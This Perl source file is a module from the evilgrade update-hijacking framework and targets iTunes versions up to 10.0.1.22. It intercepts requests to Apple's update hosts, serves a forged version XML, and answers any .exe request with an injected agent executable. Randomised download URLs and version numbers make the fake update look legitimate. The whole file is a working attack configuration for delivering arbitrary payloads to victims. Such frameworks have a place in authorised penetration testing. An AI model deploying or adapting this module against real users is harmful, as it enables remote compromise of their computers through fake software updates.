###############
# itunes.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::itunes;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'itunes',
    'version'     => '1.0',
    'appver'      => '<= Itunes 10.0.1.22',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(ax.itunes.apple.com|AkamaiGHost|itunes.apple.com)',
    'request'     => [
        {   'req'    => '/version',    #regex friendly
            'type'   => 'file',        #file|string|agent|install
            'method' => '',            #any
            'bin'    => '',
            'string' => "",
            'parse'  => '1',
            'file' => './include/itunes/itunes_version.xml'
        },
        {   'req'    => '.exe',        #regex friendly
            'type'   => 'agent',       #file|string|agent|install
            'method' => '',            #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'DATA1' => {
            'val' =>
                '\'http://itunes.com/\'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).\'/itunesupdate\'.isrcore::utils::RndNum(5).\'.exe\'',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'DATA2' => {
            'val' =>
                '\'10.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
            }

    }
};

#TODO: data1,data2 mac differences

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
